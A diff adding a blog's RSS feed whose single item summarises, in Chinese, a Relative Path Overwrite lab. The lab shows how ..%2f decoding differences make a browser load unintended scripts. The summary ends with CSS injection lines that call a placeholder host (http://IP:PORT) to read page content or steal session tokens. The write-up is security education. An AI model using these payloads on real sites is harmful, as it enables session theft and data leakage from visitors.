@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>RPO on Jhe&#39;s blog</title>
+    <link>https://ucgjhe.github.io/tags/rpo/</link>
+    <description>Recent content in RPO on Jhe&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 01 Mar 2019 14:45:48 +0800</lastBuildDate><atom:link href="https://ucgjhe.github.io/tags/rpo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Relative Path Overwrite</title>
+      <link>https://ucgjhe.github.io/post/relative_path_overwrite/</link>
+      <pubDate>Fri, 01 Mar 2019 14:45:48 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/relative_path_overwrite/</guid>
+      <description>在前端網頁引入資源(javascript, CSS)時使用相對路徑，並因為客戶端瀏覽器與伺服端解析之差異所造成的問題，可能造成瀏覽器執行預期外的 javascript 或 CSS。
+當 Apache 啟用 AllowEncodedSlashes On 或是使用 Nginx 的時候，後端伺服器會將 ..%2f 解析成 ../，但瀏覽器則會把它當成檔名的一部分，且當頁面引入資源使用相對路徑時，將造成瀏覽器與伺服器的解析不一致。
+Lab. 範例目錄結構
+index.php test/ - a.js index.html 程式碼
+&amp;lt;html&amp;gt; &amp;lt;script src=a.js&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; a.js 程式碼
+alert(1) 使用相對路徑引入一個名為 a.js 的 javascript，但其實 a.js 存在於 test 目錄下
+訪問首頁後一切正常，嘗試訪問 http://IP/test/..%2findex.html 神奇的事情發生了，alert(1) 跳了出來。
+ 瀏覽器向伺服器發出 http://IP/test/..%2findex.html 請求 伺服器將 ..%2f 轉換成 ../ 所以伺服器看到的是 http://IP/test/../index.html，所以伺服器返回的是 http://IP/index.html 的內容 瀏覽器並不會自動轉義 ..%2f 只是將之當成檔案名稱送出，收到伺服器回應後，瀏覽器依照相對路徑引入資源 a.js ，對於瀏覽器來說，當前目錄應該是 test 於是送出 http://IP/test/a.js 請求  可以用一些 CSS 的黑魔法來讀取頁面內容，或是取得瀏覽者的 session token {} @import url(http://IP:PORT); {} * {background: url(http://IP:PORT);}</description>
+    </item>
+    
+  </channel>
+</rss>
